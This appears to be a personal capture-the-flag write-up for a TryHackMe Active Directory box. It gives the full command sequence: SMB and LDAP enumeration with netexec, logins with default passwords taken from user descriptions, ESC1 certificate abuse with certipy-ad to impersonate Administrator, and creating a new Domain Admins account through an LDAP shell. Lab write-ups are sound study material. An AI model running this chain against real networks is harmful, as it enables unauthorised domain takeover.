Again, a bunch of ports

---
smb
smb- `crackmapexec smb 10.49.128.114 -u 'anonymous' -p '' --shares` 
Was only able to enumerate the shares, so tried netexec `nxc`
`nxc smb 10.48.142.173 -u 'guest' -p '' --shares` to enumerate shares
`nxc smb 10.48.142.173 -u guest -p '' --rid` gave us a bunch of usernames, no more.

`sed -n 's/.*\\\([^ ]*\) (SidTypeUser)/\1/p' nxc_rid.brute > nxc_rid_brute ; cat nxc_rid_brute ; echo '' ;wc -l nxc_rid_brute`
For a quick post processing of the output into just usernames

---
ldap
Authenticating to ldap using uest and enumerate users gives us default password of 2 users in the description. CHANGEME2023! for users susanna_mcknight and ivy_willis
`nxc ldap 10.48.142.173 -u 'guest' -p '' --users`

To check which services which user hasnt reset the password for, we try to do so with nxc.
`nxc smb 10.48.142.173 -u 'susanna_mcknight' -p 'CHANGEME2023!'`
`nxc smb 10.48.142.173 -u 'ivy_willis' -p 'CHANGEME2023!'`

then we see which ones have rdp enabled. ideally, we would check bloodhound for this, but we can also just try authenticating with nxc rdp to verify.
`nxc rdp 10.48.142.173 -u 'susanna_mcknight' -p 'CHANGEME2023!'`

So we xfreerdp to susanna_mcknight to get the user flag
`xfreerdp3 /v:10.48.142.173 /u:'susanna_mcknight' /p:'CHANGEME2023!'`

Also, get some bloodhound data
`bloodhound-python -u 'susanne_mcknight' -p 'CHANGEME2023!' -ns 10.48.142.173 -d thm.local -c All zip`

---
whoami /all shows that the user belongs to "Certificate Service DCOM access group"
Usually, we can run the Certify.exe, but there's a windows defender sitting and defending.
So, we go with certipy-ad
`certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.48.142.173 -stdout -vulnerable`

this shows us some ESC1 vulnerability on a template called ServAuth. it is misconfigured to allow **any authenticated user to enroll** and supply arbitrary subject names, enabling **ESC1 attacks** for impersonation via client authentication. specify an arbitrary UPN or DNS SAN with the `-upn` and `-dns` parameter, respectively.
Next, we use `certipy-ad` to request a certificate from the vulnerable **ServerAuth** template, while impersonating the **Administrator** user (or with Bradley_ortez, who seems to be a domain-admin user. Can be verified by bloodhound). The steps followed are from the link
https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1

`certipy-ad req -u susanna_mcknight -p 'CHANGEME2023!' -upn BRADLEY_ORTIZ@thm.local -dc-ip 10.48.142.173 -ca thm-LABYRINTH-CA -template ServerAuth`

We receive a `.pfx` certificate file. Use this to authenticate as administrator, and obtain their hash.
`sudo ntpdate -u thm.local` to sync time with the dc
`certipy-ad auth -pfx administrator.pfx -dc-ip 10.48.142.173`
use Impacket’s `smbexec` to spawn a shell and read the root flag from the **Administrator**’s desktop
`smbexec.py -k -hashes :07d6[REDACTED]2322 THM.LOCAL/Administrator@labyrinth.thm.local`
BUT this wasnt working for me for some reason. Long search lead to a video, where

`certipy-ad req -u susanna_mcknight -p 'CHANGEME2023!' -upn Administrator@thm.local -dc-ip 10.48.142.173 -ca thm-LABYRINTH-CA -template ServerAuth -ldap-simple-auth` to get an ldap cert
`certipy-ad auth administrator.pfx -dc-ip 10.48.142.173 -ldap-shell`

`# add user "CN=test,CN=Users,DC=thm,DC=local" -samid test -pwd ABC123!@#`
Sometimes, it doesnt support add user. we need to go with add_user

```ldap-shell
add_user aj
#note the password
add_user_to_group aj "domain admins"
add_user_to_group aj "remote desktop users"
```
And then rdp with new creds